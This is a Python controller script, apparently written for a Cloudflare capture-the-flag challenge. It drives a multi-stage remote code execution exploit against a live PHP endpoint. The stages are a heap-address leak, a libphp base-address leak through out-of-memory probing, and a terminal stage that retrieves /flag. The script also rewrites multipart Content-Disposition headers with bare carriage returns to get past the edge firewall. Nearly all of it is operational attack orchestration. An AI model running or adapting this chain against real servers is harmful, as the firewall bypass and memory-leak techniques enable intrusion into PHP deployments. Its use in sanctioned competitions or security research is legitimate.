#!/usr/bin/env python3
"""Run the accepted Cloudflare CTF cadence with the compact bare-CR carrier.

The controller deliberately reuses the three frozen programs that produced the
accepted solve:

* concurrent A15/B15 strict heap acquisition;
* pre-staged field-66 A5/B5 strict libphp acquisition; and
* the A80/B25/S25->D25 rolling terminal with one verifier call maximum.

Only multipart carriage changes.  The old 1,048,437-byte inert prefix is
removed and each upload-progress Content-Disposition header is rewritten to
the compact bare-CR/character-ladder form already admitted by the public edge
and proven end-to-end on the exact PHP image.  A real success still requires a
response-local marker, /flag value, X-Attempt-ID, and verifier ``verified``.
"""

from __future__ import annotations

import argparse
import hashlib
import importlib.util
import json
import os
from pathlib import Path
import secrets
import sys
import time


TARGET = "https://php-rce.cloudflare.app/php/index.php"
PACKAGE_ROOT = Path(__file__).resolve().parent
REMOTE_ROOT = PACKAGE_ROOT
STOCK_ROOT = PACKAGE_ROOT / "src/stock"
NATIVE_ROOT = PACKAGE_ROOT / "src/native"
CHAINETOOL_ROOT = PACKAGE_ROOT / "src"

BARE_PATH = REMOTE_ROOT / "bare_cr_carrier.py"
HEAP_PATH = STOCK_ROOT / "flood_heap_oracle_live.py"
CODE_PATH = NATIVE_ROOT / "code_dtor_fatal_probe.py"
HYBRID_PATH = NATIVE_ROOT / "hybrid8511.py"
TERMINAL_PATH = STOCK_ROOT / "rolling_seedfire_stable25_live.py"

SOURCE_PINS = {
    BARE_PATH: "11a2d7e110157571b2d519691021ea04775bb0f41d6dc94eef6088cb1eb95dcf",
    HEAP_PATH: "6cacbf19e29dced74687a7c5465f0b75bbca11247d52b73cbe2312b4cd185817",
    CODE_PATH: "6f93a2a02116e5690a6e30720f9b0c7cf5cc54a5ab8d9b14fc65ccd3190d13b3",
    HYBRID_PATH: "71c55ebf519d8e334c22d471752912c0539bb606cb00d3d120d67f7359d0ef18",
    TERMINAL_PATH: "b4af5181681226d87cfb89fea0052bce1b1c605e320306d645bbda1cd5832c7b",
}

HEAP_PINS = {
    "arm_bytes": 1_012_641,
    "arm_sha256": "158a87f3d00d51c2cb5e0f64776a8208ea0fa493204bf5d14c5f01b7ef747b41",
    "b_bytes": 1_236_226,
    "b_sha256": "719a69106c422aa87b44bef4f71f53d300c7f6d033af443a410af4da72896f9c",
}

CODE_PINS = {
    "producer_bytes": 251_721,
    "producer_sha256": "e88322cc1569b936256bbd2a96b9a166d289228ccd6d57151715c67c539d789b",
    "consumer_bytes": 92_440,
    "consumer_sha256": "b3b9380a6cb8b2d56d7860bc7b57e2747f9709e15926e20d091e5c9f806e35bf",
}

TERMINAL_PINS = {
    "A": {
        "bytes": 1_012_641,
        "sha256": "158a87f3d00d51c2cb5e0f64776a8208ea0fa493204bf5d14c5f01b7ef747b41",
    },
    "B": {
        "bytes": 952_812,
        "sha256": "e2b1de5ec558954a68d0f8f06b8a586b34f6ffe5e25bf19b2c2aa67062e41f40",
    },
    "S": {"bytes": 7_205_832},
    "D": {
        "bytes": 6_138_311,
        "sha256": "d7ea90a4da90cbf4b2942f707276c22d463859734c72e70c9be76281633b7dbf",
    },
}

ALIGNMENT = 0x20_0000
MAX_PAIR_DELTA = 0x800_0000
ACCEPTED_SCHEDULE = (
    "A80; B25; S25 fanout; D submitted on each successful S completion"
)


class GateStop(RuntimeError):
    pass


def sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def file_sha256(path: Path) -> str:
    digest = hashlib.sha256()
    with path.open("rb") as stream:
        for block in iter(lambda: stream.read(1 << 20), b""):
            digest.update(block)
    return digest.hexdigest()


def load_module(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    if spec is None or spec.loader is None:
        raise GateStop(f"cannot load {path}")
    module = importlib.util.module_from_spec(spec)
    sys.modules[name] = module
    spec.loader.exec_module(module)
    return module


def write_exclusive(path: Path, document: dict) -> None:
    payload = (json.dumps(document, indent=2, sort_keys=True) + "\n").encode()
    flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
    if hasattr(os, "O_NOFOLLOW"):
        flags |= os.O_NOFOLLOW
    descriptor = os.open(path, flags, 0o600)
    try:
        view = memoryview(payload)
        while view:
            view = view[os.write(descriptor, view):]
        os.fsync(descriptor)
    finally:
        os.close(descriptor)


def assert_source_pins() -> dict[str, str]:
    observed = {}
    for path, expected in SOURCE_PINS.items():
        actual = file_sha256(path)
        if actual != expected:
            raise GateStop(f"source pin drift: {path} is {actual}")
        observed[str(path)] = actual
    return observed


def assert_wire(actual: dict, expected: dict, label: str) -> None:
    for key, value in expected.items():
        if actual.get(key) != value:
            raise GateStop(
                f"{label} wire {key} drift: {actual.get(key)!r} != {value!r}"
            )


def install_heap_carrier(bare, steer, log: list[dict]) -> None:
    def compact_pre(body: bytes) -> bytes:
        if body.startswith(b"--" + steer.sc.ARM_BOUNDARY):
            stage, boundary = "heap-arm", steer.sc.ARM_BOUNDARY
        elif body.startswith(b"--" + steer.BND):
            stage, boundary = "heap-disclose", steer.BND
        else:
            raise GateStop("heap body has an unexpected multipart boundary")
        wrapped, meta = bare.apply_bare_cr(
            bare.CARRIER_KIND, stage, body, boundary
        )
        if meta["header_rewrite_count"] != 1:
            raise GateStop(f"{stage} must rewrite exactly one protected header")
        log.append(meta)
        return wrapped

    steer.pre = compact_pre


def install_code_carrier(bare, probe, log: list[dict]) -> None:
    def compact_add(body: bytes, _old_length: int) -> bytes:
        wrapped, meta = bare.apply_bare_cr(
            bare.CARRIER_KIND, "code", body, probe.h.kb.COOKIE_BOUNDARY
        )
        if meta["header_rewrite_count"] != 1:
            raise GateStop("code body must rewrite exactly one protected header")
        log.append(meta)
        return wrapped

    probe.h.add_preamble = compact_add


def install_terminal_carrier(bare, terminal, log: list[dict]) -> None:
    real_load_wave = terminal.load_wave

    def compact_load_wave():
        wave = real_load_wave()

        disposition = b"Content-Disposition: form-data;"
        bare_disposition = b"Content-Disposition:\rform-data;"

        def all_dispositions(body: bytes, boundary: bytes) -> tuple[bytes, dict]:
            if not body.startswith(b"--" + boundary):
                raise GateStop("terminal body lost its multipart boundary")
            count = body.count(disposition)
            if count < 1:
                raise GateStop("terminal body has no disposition to rewrite")
            wrapped = body.replace(disposition, bare_disposition)
            if len(wrapped) != len(body):
                raise GateStop("all-disposition rewrite changed body length")
            if disposition in wrapped:
                raise GateStop("terminal body retained a canonical disposition")
            return wrapped, {
                "stage": "terminal",
                "carrier_kind": "bare-cr-all-dispositions",
                "carrier_bytes": 0,
                "carrier_sha256": sha256(b""),
                "native_body_bytes": len(body),
                "native_body_sha256": sha256(body),
                "wrapped_bytes": len(wrapped),
                "wrapped_sha256": sha256(wrapped),
                "native_body_offset": 0,
                "header_rewrite_count": count,
                "body_size_delta": 0,
                "raw_protected_name_contiguous": bare.PROGRESS in wrapped,
                "raw_flag_path_contiguous": b"/flag" in wrapped,
                "wrapped_under_post_max_size": (
                    len(wrapped) + 4096 <= bare.base.POST_MAX_SIZE
                ),
            }

        def compact_add(body: bytes) -> bytes:
            if body.startswith(b"--" + wave.single.ARM_BOUNDARY):
                stage, boundary = "heap-arm", wave.single.ARM_BOUNDARY
            elif body.startswith(b"--" + wave.single.DISC_BOUNDARY):
                stage, boundary = "heap-flush", wave.single.DISC_BOUNDARY
            elif body.startswith(b"--" + wave.terminal.BOUNDARY):
                stage, boundary = "terminal", wave.terminal.BOUNDARY
            else:
                raise GateStop("terminal body has an unexpected multipart boundary")
            if stage == "terminal":
                wrapped, meta = all_dispositions(body, boundary)
            else:
                wrapped, meta = bare.apply_bare_cr(
                    bare.CARRIER_KIND, stage, body, boundary
                )
                if meta["header_rewrite_count"] != 1:
                    raise GateStop(f"{stage} protected-header count drifted")
            log.append(meta)
            return wrapped

        wave.base.add_preamble = compact_add
        real_write_receipt = wave.write_receipt

        def corrected_write_receipt(path, receipt):
            if receipt.get("schema") == "cfctf/rolling-seedfire-live/v1":
                receipt["schedule"] = ACCEPTED_SCHEDULE
                receipt.setdefault("session", {})[
                    "multipart_bodies_modified"
                ] = True
                receipt["carrier"] = "bare-cr-all-dispositions"
                receipt["terminal_mode"] = "derived-adjacent"
            return real_write_receipt(path, receipt)

        wave.write_receipt = corrected_write_receipt
        return wave

    terminal.load_wave = compact_load_wave
    terminal.WIRE_PINS = TERMINAL_PINS


def with_argv(argv: list[str], function) -> int:
    previous = sys.argv
    sys.argv = argv
    try:
        return int(function())
    finally:
        sys.argv = previous


def strict_pair(heap_receipt: dict, code_receipt: dict) -> tuple[int, int, dict]:
    if heap_receipt.get("verdict") != "STRICT_HEAP":
        raise GateStop("heap acquisition did not return STRICT_HEAP")
    assert_wire(heap_receipt.get("wire", {}), HEAP_PINS, "heap")
    heap_selected = heap_receipt.get("selected") or {}
    if int(heap_selected.get("votes") or 0) < 1:
        raise GateStop("heap acquisition returned no agreeing vote")
    heap = int(str(heap_selected["heap"]), 16)

    if code_receipt.get("verdict") != "STRICT_CODE_POINTER":
        raise GateStop("code acquisition did not return STRICT_CODE_POINTER")
    assert_wire(code_receipt.get("wire", {}), CODE_PINS, "code")
    if code_receipt.get("epoch_risk") is not False:
        raise GateStop("code acquisition marked epoch risk")
    stop_classes = set(code_receipt.get("stop_classes") or [])
    if stop_classes - {"managed_block_403"}:
        raise GateStop("code acquisition returned a non-WAF stop class")
    producers = code_receipt.get("responses", {}).get("producer", [])
    if len(producers) != 5 or any(
        row.get("status") != 200 or not row.get("oom") for row in producers
    ):
        raise GateStop("code producer wave did not pass its 5/5 OOM gate")
    code_selected = code_receipt.get("selected") or {}
    if code_selected.get("profile") != "official":
        raise GateStop("code acquisition did not select the official profile")
    if int(code_selected.get("profile_offset") or 0) != 0x7B47A0:
        raise GateStop("code acquisition selected the wrong dtor offset")
    if int(code_selected.get("votes") or 0) < 1:
        raise GateStop("code acquisition returned no strict official vote")
    libphp = int(code_selected["libphp"])

    delta = libphp - heap
    if heap % ALIGNMENT or libphp % ALIGNMENT:
        raise GateStop("strict pair is not 2 MiB aligned")
    if not (0 < delta <= MAX_PAIR_DELTA):
        raise GateStop(f"strict pair separation is implausible: {hex(delta)}")
    return heap, libphp, {
        "heap": hex(heap),
        "heap_votes": int(heap_selected["votes"]),
        "libphp": hex(libphp),
        "code_votes": int(code_selected["votes"]),
        "code_stop_classes": sorted(stop_classes),
        "separation": hex(delta),
        "same_run": True,
        "direct_measurements": True,
    }


def public_summary(document: dict) -> dict:
    return {
        "verdict": document.get("verdict"),
        "stop_reason": document.get("stop_reason"),
        "heap_verdict": document.get("heap_verdict"),
        "code_verdict": document.get("code_verdict"),
        "strict_pair": document.get("strict_pair"),
        "terminal_verdict": document.get("terminal_verdict"),
        "verifier_accepted": document.get("verifier_accepted", False),
        "private_flag_artifact": document.get("private_flag_artifact"),
        "out_dir": document.get("out_dir"),
    }


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--out-dir", required=True, type=Path)
    parser.add_argument("--timeout", type=float, default=90.0)
    parser.add_argument("--authorized-live", action="store_true")
    parser.add_argument("--dry-run", action="store_true")
    return parser


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    if not args.dry_run and not args.authorized_live:
        parser.error("live execution requires --authorized-live")
    if not 10 <= args.timeout <= 180:
        parser.error("--timeout must be in 10..180 seconds")
    if os.path.lexists(args.out_dir):
        parser.error("--out-dir must be fresh")

    os.umask(0o077)
    args.out_dir.mkdir(mode=0o700, parents=True)
    sources = assert_source_pins()
    for path in (CHAINETOOL_ROOT, STOCK_ROOT, NATIVE_ROOT):
        value = str(path)
        if value not in sys.path:
            sys.path.insert(0, value)

    bare = load_module("bare_cr_accepted_schedule_carrier", BARE_PATH)
    heap_module = load_module("bare_cr_accepted_heap", HEAP_PATH)
    import steer_ht

    heap_log: list[dict] = []
    install_heap_carrier(bare, steer_ht, heap_log)

    document = {
        "schema": "cfctf-r8/bare-cr-accepted-schedule/1",
        "target": TARGET,
        "started_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "out_dir": str(args.out_dir),
        "sources": sources,
        "request_plan": {
            "heap": "A15 then B15, concurrent within each wave",
            "code": "prestage field-66 A5/B5, release A then B",
            "terminal": ACCEPTED_SCHEDULE,
            "verifier_cap": 1,
        },
        "verdict": "NOT_RUN",
    }

    try:
        heap_dir = args.out_dir / "heap"
        heap_args = [
            "--arms", "15", "--b-count", "15",
            "--out-dir", str(heap_dir), "--authorized-live",
        ]
        if args.dry_run:
            heap_args.append("--dry-run")
        heap_exit = heap_module.main(heap_args)
        heap_receipt = json.loads((heap_dir / "receipt.json").read_text())
        document["heap_exit"] = heap_exit
        document["heap_verdict"] = heap_receipt.get("verdict")
        document["heap_wire"] = heap_receipt.get("wire")
        assert_wire(heap_receipt.get("wire", {}), HEAP_PINS, "heap")
        if not args.dry_run and heap_receipt.get("verdict") != "STRICT_HEAP":
            raise GateStop("heap acquisition did not return STRICT_HEAP")

        # A stale module with this name also exists under the stock directory.
        # Bind the pinned native 8.5.11 implementation explicitly before the
        # field-66 probe imports it.
        hybrid = load_module("hybrid8511_native_barecr", HYBRID_PATH)
        sys.modules["hybrid8511"] = hybrid
        probe = load_module("bare_cr_accepted_code", CODE_PATH)
        code_log: list[dict] = []
        install_code_carrier(bare, probe, code_log)
        code_path = args.out_dir / "code-receipt.json"

        if args.dry_run:
            shape = probe.code_shape(66)
            producer = probe.h.add_preamble(
                probe.h.kb.producer_body(shape, probe.h.kb.COOKIE_BOUNDARY),
                1_048_437,
            )
            consumer = probe.h.add_preamble(
                probe.h.kb.consumer_body("code", probe.h.kb.COOKIE_BOUNDARY),
                1_048_437,
            )
            code_receipt = {
                "verdict": "DRY_RUN",
                "wire": {
                    "producer_bytes": len(producer),
                    "producer_sha256": sha256(producer),
                    "consumer_bytes": len(consumer),
                    "consumer_sha256": sha256(consumer),
                },
            }
            assert_wire(code_receipt["wire"], CODE_PINS, "code")
            write_exclusive(code_path, code_receipt)
            code_exit = 0
        else:
            code_exit = with_argv([
                str(CODE_PATH),
                "--target", TARGET,
                "--field-count", "66",
                "--fanout", "5",
                "--timeout", str(args.timeout),
                "--waf-preamble", "1048437",
                "--content-type-variant", "canonical",
                "--prestage-pair",
                "--authorized-live",
                "--out", str(code_path),
            ], probe.main)
            code_receipt = json.loads(code_path.read_text())
        document["code_exit"] = code_exit
        document["code_verdict"] = code_receipt.get("verdict")
        document["code_wire"] = code_receipt.get("wire")

        terminal = load_module("bare_cr_accepted_terminal", TERMINAL_PATH)
        terminal_log: list[dict] = []
        install_terminal_carrier(bare, terminal, terminal_log)
        terminal_dir = args.out_dir / "terminal"
        session_id = "r" + secrets.token_hex(9)

        if args.dry_run:
            terminal_exit = terminal.main([
                "--heap", "0x7f0000000000",
                "--libphp", "0x7f0002000000",
                "--timeout", str(args.timeout),
                "--out-dir", str(terminal_dir),
                "--session-id", session_id,
                "--dry-run",
            ])
            pair = None
        else:
            if heap_exit != 0:
                raise GateStop("heap controller returned a non-zero status")
            if code_exit != 0:
                raise GateStop("code controller returned a non-zero status")
            heap, libphp, pair = strict_pair(heap_receipt, code_receipt)
            document["strict_pair"] = pair
            terminal_exit = terminal.main([
                "--heap", hex(heap),
                "--libphp", hex(libphp),
                "--timeout", str(args.timeout),
                "--out-dir", str(terminal_dir),
                "--session-id", session_id,
                "--authorized-live",
            ])

        terminal_receipt = json.loads((terminal_dir / "receipt.json").read_text())
        document["terminal_exit"] = terminal_exit
        document["terminal_verdict"] = terminal_receipt.get("verdict")
        document["terminal_request_count"] = terminal_receipt.get("request_count")
        document["verifier_accepted"] = terminal_receipt.get("verdict") == "VERIFIER_ACCEPTED"
        flag_path = terminal_dir / "flag.txt"
        if document["verifier_accepted"]:
            if not flag_path.is_file() or (flag_path.stat().st_mode & 0o077):
                raise GateStop("accepted terminal did not leave a private flag artifact")
            document["private_flag_artifact"] = str(flag_path)
            document["verdict"] = "VERIFIER_ACCEPTED"
        elif args.dry_run:
            document["verdict"] = "DRY_RUN_READY"
        else:
            document["verdict"] = "NO_VERIFIER_ACCEPTANCE"

        write_exclusive(args.out_dir / "carrier-log.json", {
            "schema": "cfctf-r8/bare-cr-accepted-schedule-carriers/1",
            "heap": heap_log,
            "code": code_log,
            "terminal": terminal_log,
        })
    except Exception as error:
        document["verdict"] = "GATE_STOP"
        document["stop_reason"] = f"{type(error).__name__}: {error}"

    document["finished_utc"] = time.strftime(
        "%Y-%m-%dT%H:%M:%SZ", time.gmtime()
    )
    write_exclusive(args.out_dir / "summary.json", document)
    print(json.dumps(public_summary(document), indent=2, sort_keys=True))
    return 0 if document["verdict"] == "VERIFIER_ACCEPTED" else (
        0 if document["verdict"] == "DRY_RUN_READY" else 2
    )


if __name__ == "__main__":
    raise SystemExit(main())
